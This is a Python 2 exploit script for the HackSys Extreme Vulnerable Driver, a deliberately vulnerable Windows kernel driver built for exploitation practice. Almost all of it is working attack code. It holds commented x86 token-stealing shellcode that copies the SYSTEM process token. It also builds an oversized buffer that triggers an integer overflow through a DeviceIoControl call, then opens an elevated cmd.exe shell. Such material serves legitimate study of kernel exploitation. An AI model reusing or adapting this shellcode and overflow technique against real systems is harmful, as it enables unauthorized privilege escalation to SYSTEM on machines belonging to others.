import ctypes, struct, sys, os
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32

def heap_alloc_payload():
	token_stealing_shellcode = (
		#---[Setup]
		"\x60"                      # pushad
		"\x64\xA1\x24\x01\x00\x00" 	# mov eax, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
		"\x89\xC1"                  # mov ecx, eax (Current _EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" 	# mov ebx, [eax + TOKEN_OFFSET]
		#---[Copy System PID token]
		"\xBA\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
		"\x39\x90\xB4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
		"\x75\xED"                  # jnz                           ->|
		"\x8B\x90\xF8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
		#---[Recover]
		"\x61"                      # popad
		"\x31\xC0"                  # NTSTATUS -> STATUS_SUCCESS
		"\x5D"                      # pop ebp
		"\xC2\x08\x00"              # ret 8
	)
	
	payload_address = id(token_stealing_shellcode) + 20
	print "[+] Payload address: 0x%X" % payload_address
	return payload_address


def trigger_integer_overflow():
	dwReturn      = c_ulong()
	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not driver_handle or driver_handle == -1:
		print "[!] Driver handle not found : Error " + str(ctypes.GetLastError())
		sys.exit()
		
	# [-- BUFFER PADDING --][-- EXTRA PADDING --][-- SHELLCODE PTR --][-- STRING TERMINATOR --]
	print "[+] Constructing overflow string"
	evil_input = "A" * 0x800 + "BBBB" * 10 + struct.pack("<L",heap_alloc_payload()) + struct.pack("<L",0xBAD0B0B0)
	evil_size  = len(evil_input)
	evil_input_ptr = id(evil_input) + 20
	print "[+] Buf size: %d" % evil_size
	einput  = create_string_buffer(evil_input, evil_size)
	print "[+] Triggering vuln .."
	kernel32.DeviceIoControl(driver_handle, 0x222027, evil_input_ptr, 0xFFFFFFFF, None, 0,byref(dwReturn), None)
	
	if shell.IsUserAnAdmin():
		print "[*] Enjoy Elevated Privs !\r\n"
		os.system('cmd.exe')
	else:
		print "[-] Exploit did not work. Re-run it!"
	

def preamble():
	print "\r\n"
	print "HackSys Extreme Vulnerable Driver : Integer Overflow"
	print "Author: @GradiusX"
	print "\r\n"

	
if __name__ == '__main__':
	preamble()
	trigger_integer_overflow()
